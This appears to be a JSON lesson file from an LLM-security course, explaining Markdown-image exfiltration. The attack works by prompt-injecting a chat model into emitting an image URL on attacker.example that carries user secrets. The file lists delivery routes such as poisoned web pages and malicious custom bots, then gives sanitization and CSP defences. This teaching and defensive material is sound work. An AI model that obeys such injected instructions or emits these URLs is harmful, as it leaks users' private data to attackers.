@@ -1,0 +1,56 @@
+{
+  "slug": "08-markdown-exfil",
+  "title": "Markdown Exfiltration",
+  "type": "content",
+  "readingtime": "9 min read",
+  "difficulty": "Intermediate",
+  "sections": [
+    {
+      "type": "content",
+      "body": "# Markdown Exfiltration\n\nExfiltration means secretly stealing data out of a system. This is one of the most common real-world LLM vulnerabilities, because it turns a genuinely helpful formatting feature into a serious data leak.\n\nMany chat apps render Markdown directly in the model's replies: bold text, lists, code blocks, and crucially, images. An image in Markdown looks like this:"
+    },
+    {
+      "type": "code",
+      "language": "text",
+      "body": "![alt text](https://example.com/pic.png)"
+    },
+    {
+      "type": "content",
+      "body": "When the app renders that syntax, the victim's browser automatically fetches the URL in order to load the image. No click is required from the user at all. That automatic fetch is precisely the leak channel."
+    },
+    {
+      "type": "content",
+      "body": "## The core trick\n\nIf you can make the model output an image whose URL points to your own server, and embed secret data directly into that URL, the victim's browser quietly sends that secret to you the moment it tries to load the \"image.\""
+    },
+    {
+      "type": "code",
+      "language": "text",
+      "body": "![invalid](http://attacker.example/x.png?c=[SECRET])"
+    },
+    {
+      "type": "content",
+      "body": "You instruct the model to replace `[SECRET]` with real data from the conversation, such as the user's chat history, a password they mentioned, or the contents of a document the model has access to. The image itself fails to load, since it doesn't actually exist, but the request has already reached your server carrying the data along with it.\n\nA quick encoding note: URL-encode the smuggled data. Replacing spaces with `+` handles the basic cases, but characters like `&`, `=`, and `?` can break the URL structure, so more complex secrets may need proper encoding, or the leak partially fails."
+    },
+    {
+      "type": "diagram",
+      "src": "sequenceDiagram\n    participant Atk as Attacker payload\n    participant LLM as Model\n    participant V as Victim browser\n    participant Srv as Attacker server\n    Atk->>LLM: Emit image with secret in URL\n    LLM->>V: Renders Markdown image\n    V->>Srv: Auto-fetches http://attacker/x.png?c=SECRET\n    Srv-->>V: 404 (does not matter)\n    Note over Srv: Attacker reads SECRET from access log"
+    },
+    {
+      "type": "content",
+      "body": "## From self-test to real attack\n\nSending the exfiltration prompt to yourself proves the underlying mechanism works, but a real victim won't willingly paste your malicious prompt into their own chat. Real attacks deliver the payload through indirect prompt injection instead, meaning the payload rides inside content the victim voluntarily feeds to their model. Common delivery routes include:\n\n- **Website summarizer** — the victim asks the model to summarize a page you control. That page contains hidden instructions that trigger the image-based exfiltration of their chat history.\n- **Message screening** — the victim uses an LLM to check incoming messages for rule violations. Your message contains the payload, leaking the other messages in that batch back to you.\n- **Malicious custom chatbot** — you publish a \"helpful\" bot whose system prompt quietly exfiltrates every single user message it receives.\n\nBecause any secrets, documents, or emails the model can access all become reachable through this same channel, the overall impact scales directly with the model's privileges."
+    },
+    {
+      "type": "content",
+      "body": "## Exfiltration even without Markdown\n\nIf the app doesn't render Markdown images at all, the browser won't auto-fetch anything, so the victim would have to actually click a leaked link, which is far less reliable for an attacker. But two edge cases keep this risk alive regardless:\n\n- **Link previews** — some clients automatically fetch a URL just to generate a preview card. That auto-fetch behavior re-enables no-click exfiltration entirely.\n- **Plugin/tool auto-fetch** — if the model has a browsing tool that visits links on its own initiative, the leak fires without any user interaction whatsoever.\n\nSo \"we don't render Markdown\" is not, on its own, a complete defense."
+    },
+    {
+      "type": "code",
+      "language": "python",
+      "body": "# The safe pattern: control which external resources output may reference.\n\n# VULNERABLE: render model Markdown as-is, allowing arbitrary image URLs\nhtml = markdown_to_html(model_output)   # <img src='http://attacker/...'> allowed\n\n# SECURE: sanitize rendered output and restrict outbound URLs\nimport bleach\n\nALLOWED_TAGS = [\"b\", \"i\", \"code\", \"pre\", \"ul\", \"li\", \"p\", \"strong\", \"em\"]\n# Note: 'img' is intentionally excluded, or its src is validated below.\n\ndef safe_render(model_output):\n    raw = markdown_to_html(model_output)\n    clean = bleach.clean(raw, tags=ALLOWED_TAGS, strip=True)\n    return clean\n\n# Additional layers:\n# - Content Security Policy: img-src 'self' data:  (block external image hosts)\n# - Strip or rewrite any URL that is not on an allowlist of trusted domains."
+    },
+    {
+      "type": "note",
+      "body": "**Two strong controls:** first, a Content Security Policy with a tight `img-src` prevents the browser from loading images from attacker-controlled domains in the first place. Second, sanitizing rendered output by removing or validating image and link URLs against an allowlist. Together, these two controls close the automatic-fetch channel that makes this attack so silent and effective."
+    }
+  ]
+}
